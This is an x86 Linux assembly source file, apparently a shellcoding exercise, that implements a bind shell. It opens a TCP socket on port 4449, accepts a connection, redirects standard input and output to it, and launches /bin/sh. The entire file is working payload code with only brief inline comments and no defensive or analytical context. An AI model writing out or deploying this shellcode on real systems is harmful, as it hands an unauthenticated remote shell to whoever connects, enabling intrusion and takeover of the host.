; Filename: bindShell.nasm
; Author:  Abdulrahman Alhoshani
;
;
; Purpose:

global _start			

section .text
_start:
	; Create Socket (socketcall(call,args))
	xor eax, eax		; zeroing
	mov al, 0x66		; socketcall
	xor ebx,ebx		
	mov bl, 1		; for creating the socket socket() call

	xor ecx, ecx		; zeroing
	push ecx		; IPROTO_IP
	push 1			; SOCK_STREAM
	push 2			; AF_INET

	mov ecx, esp		; saving address of our pushed argumnets
	int 0x80		; calling the system call
	;mov esi, eax		; socket status to esi


	; Bind socket
	;xor edi, edi		; zeroing 
	pop ebx			; pop 2 from stack which is SYS_BIND call
	pop esi			; I dont want this in here anymore :)
	;xor edx, edx		; zeroing
	push edx		; pushing zero to accept any address (INADDR_ANY)
	push word 0x6111 	; this is the port (4449)
	push edx
	push byte 0x02		; AF_INET
	push 16			; 16 bit which is address length
	push ecx		; address of our arguments	
	push eax		; our socketfd	
	mov ecx, esp		; save address to arguments
	mov al, 0x66
	int 0x80		; call it

	; Listening
	mov [ecx+4],eax 	; replacing the new socketfd 
	xor eax, eax		; zeroing
	mov al, 0x66		; socketcall 
	xor ebx, ebx		; zeroing
	mov bl, 0x4		; this for listening 
	int 0x80		; call it
	

	; Accept
	xor eax, eax		; zeroing
	mov al, 0x66		
	;xor ebx, ebx
	mov bl, 5		; 5 for Accept
	int 0x80		; call it 

	; dup2	this will redirect input and output to the connected session
	mov ebx, eax
	xor ecx, ecx
	mov cl, 2
	loopy:
	mov al,	63		; 63 --> dup2 sys_call
	int 0x80
	dec ecx
	jns loopy

	; execve	"execve /bin/sh"
	xor eax, eax
	push eax

	push 0x68732f2f	
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp


	mov al, 11
	int 0x80

